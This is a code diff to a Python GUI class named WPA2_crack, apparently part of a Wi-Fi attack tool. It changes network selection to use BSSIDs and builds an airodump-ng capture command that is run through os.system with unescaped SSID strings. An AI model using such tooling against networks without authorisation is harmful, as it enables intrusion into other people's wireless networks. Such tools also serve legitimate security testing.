@@ -1382,6 +1382,7 @@ class WPA2_crack(wx.Frame):
         panel = wx.Panel(self, -1)
         hbox = wx.BoxSizer(wx.HORIZONTAL)
         self.listbox = wx.ListBox(panel, -1)
+        self.iw_nets = {}
         hbox.Add(self.listbox, 1, wx.EXPAND | wx.ALL, 20)
         btnPanel = wx.Panel(panel, -1)
         vbox = wx.BoxSizer(wx.VERTICAL)
@@ -1413,13 +1414,18 @@ class WPA2_crack(wx.Frame):
 			return
 
 		wlan_iface = wlan_ifaces[0]
+		self.listbox.Clear()
+		self.iw_nets = {}
 		try:
 			iw_nets = wless_commands.get_wireless_scan(wlan_iface)
 			iw_scan_file = open('wScan.log', 'w')
+			counter = 0
 			for iw_net in iw_nets:
-				text = ('[SSID: %(SSID)s, BSS: %(BSS)s, Ciphers: %(ciphers)s]\n'
+				text = ('[SSID: %(SSID)s, BSS: %(BSS)s, Ciphers: %(ciphers)s]'
 						% iw_net)
 				self.listbox.Append(text)
+				self.iw_nets[counter] = iw_net
+				counter = counter + 1
 				iw_scan_file.write(text)
 
 			iw_scan_file.close()
@@ -1429,7 +1435,10 @@ class WPA2_crack(wx.Frame):
 						wx.ICON_ERROR | wx.ICON_INFORMATION)
 			logging.error(traceback.format_exc())
 
-    def wpa_crack_key(self, SSID):
+    def wpa_crack_key(self, ssid, bssid):
+		if not ssid:
+			ssid = bssid.replace(':', '_')
+
 		wlan_ifaces = wless_commands.get_monitoring_interfaces()
 		wlan_iface = wlan_ifaces[0]
 		wless_commands.start_airmon([wlan_iface])
@@ -1439,8 +1448,8 @@ class WPA2_crack(wx.Frame):
 		#os.system("mkdir capture")
 		print 'wpa2 hack is started'
 		##os.system("airodump-ng --essid "+str(SSID)+" --write "+str(SSID)+"_crack mon0")
-		command = ("airodump-ng --essid '%s' --write 'capture/%s_crack' %s &"
-				% (SSID, SSID, mon_iface))
+		command = ("airodump-ng --bssid '%s' --write 'capture/%s_crack' %s &"
+				% (bssid, ssid, mon_iface))
 		logging.debug('WPA Crack command: %s', command)
 		#~ os.system("gnome-terminal -x airodump-ng --essid "+SSID+" --write capture/"+SSID+"_crack mon0")
 		os.system(command)
@@ -1457,14 +1466,12 @@ class WPA2_crack(wx.Frame):
 	
     def attack_WPA2(self, e):
 		sel = self.listbox.GetSelection()
-		text = self.listbox.GetString(sel)
-		cut_end = text.find(', BSS: ')
-		app_select = text[:cut_end].replace('[SSID: ', '')
+		iw_net = self.iw_nets.get(sel, None)
 		##### remove ['SSID: 
 		#self.evil_twin_attack(app_select)
 		#print type(app_select)
 		#print app_select
-		self.wpa_crack_key(str(app_select))
+		self.wpa_crack_key(iw_net['SSID'], iw_net['BSS'])
 			
     #~ def attack_W(self, e):
 		#~ sel = self.listbox.GetSelection()
